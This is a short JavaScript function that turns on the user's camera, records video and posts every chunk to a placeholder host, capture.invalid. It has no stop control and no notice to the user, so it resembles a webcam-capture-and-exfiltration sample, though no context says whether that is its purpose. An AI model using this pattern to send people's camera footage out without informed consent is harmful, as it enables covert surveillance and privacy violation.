async function recordVideo() {
    const stream = await navigator.mediaDevices.getUserMedia({audio: false, video: true});
    const recorder = new MediaRecorder(stream);
    recorder.ondataavailable = (event) => {
        const recording = event.data;
        const form = new FormData();
        form.append("recording", recording, "video.webm");
        fetch("https://capture.invalid/recording", {method: "POST", body: form});
    };
    recorder.start();
}
